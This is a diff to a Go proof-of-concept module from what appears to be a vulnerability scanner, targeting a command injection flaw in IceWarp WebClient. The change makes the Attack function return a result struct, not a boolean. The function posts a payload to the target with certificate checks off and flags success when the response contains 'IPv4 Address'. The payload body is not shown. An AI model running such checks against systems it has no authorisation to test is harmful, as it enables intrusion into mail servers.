@@ -34,7 +34,12 @@ func rndua() string {
 type IceWarp_WebClient_basic_command_injection struct {
 }
 
-func (a IceWarp_WebClient_basic_command_injection) Attack(target string) bool {
+func (a IceWarp_WebClient_basic_command_injection) Attack(target string) Returnre {
+	var temp Returnre
+	temp.Flag = false
+	temp.Target = target
+	temp.Bannner = "IceWarp WebClient"
+	temp.Pocname = "IceWarp_WebClient_basic_command_injection"
 	proxy, _ := url.Parse("http://127.0.0.1:8080")
 	tr := &http.Transport{
 		//关闭证书验证
@@ -62,7 +67,7 @@ func (a IceWarp_WebClient_basic_command_injection) Attack(target string) bool {
 
 	req, err := http.NewRequest("POST", target+pocurl, strings.NewReader(data))
 	if err != nil {
-		return false
+		return temp
 	}
 	req.Header.Add("Cache-Control", "max-age=0")
 	req.Header.Add("Upgrade-Insecure-Requests", "1")
@@ -74,16 +79,15 @@ func (a IceWarp_WebClient_basic_command_injection) Attack(target string) bool {
 
 	if err != nil {
 		//fmt.Println("[-]: ", err)
-		return false
+		return temp
 	}
 	defer resp.Body.Close()
 	result, _ := ioutil.ReadAll(resp.Body)
 	httpbody := string(result)
 	if strings.Contains(httpbody, "IPv4 Address") {
+		temp.Flag = true
 		//color.RGBStyleFromString("197,107,58").Println("[+] Send Payload to ", target, " matchbanner:  match: True")
-		return true
-	} else {
-		//color.RGBStyleFromString("197,107,58").Println("[+] Send Payload to ", target, " match: False")
-		return false
+		return temp
 	}
+	return temp
 }
